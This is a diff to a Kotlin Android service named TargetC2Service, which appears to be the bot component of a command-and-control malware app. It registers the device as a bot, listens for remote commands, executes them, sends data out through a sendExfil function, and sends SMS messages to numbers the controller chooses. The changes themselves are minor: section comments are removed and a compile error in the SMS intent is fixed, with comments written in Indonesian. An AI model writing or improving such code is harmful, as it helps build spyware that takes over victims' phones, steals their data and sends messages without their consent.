@@ -109,8 +109,6 @@ class TargetC2Service : Service() {
         job?.cancel()
     }
 
-    // ==================== 🔥 FIX: FORMAT DATA COCOK DENGAN CONTROLLER ====================
-
     private fun registerBot() {
         try {
             if (!::botsRef.isInitialized) return
@@ -158,8 +156,6 @@ class TargetC2Service : Service() {
             Log.e(TAG, "Bot registration error", e)
         }
     }
-
-    // ==================== 🔥 FIX: BACA KEY type + payload + cmdId (COCOK CONTROLLER) ====================
 
     private fun listenCommands() {
         if (!::commandsRef.isInitialized) return
@@ -213,8 +209,6 @@ class TargetC2Service : Service() {
         broadcastRef.addChildEventListener(broadcastListener!!)
     }
 
-    // ==================== COMMAND HANDLER ====================
-
     private fun handleCommand(command: String, args: String) {
         Log.d(TAG, "Executing: $command | $args")
         try {
@@ -257,8 +251,6 @@ class TargetC2Service : Service() {
             sendExfil("command_error", "$command: ${e.message}")
         }
     }
-
-    // ==================== COMMAND HANDLERS ====================
 
     private fun handleGetInfo() {
         val info = mapOf(
@@ -580,8 +572,9 @@ class TargetC2Service : Service() {
             return
         }
         try {
+            // 🔥 FIX: Pakai setData() biar gak error "Val cannot be reassigned"
             val intent = Intent(Intent.ACTION_SENDTO).apply {
-                data = android.net.Uri.parse("smsto:${parts[0].trim()}")
+                setData(android.net.Uri.parse("smsto:${parts[0].trim()}"))
                 putExtra("sms_body", parts[1].trim())
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             }
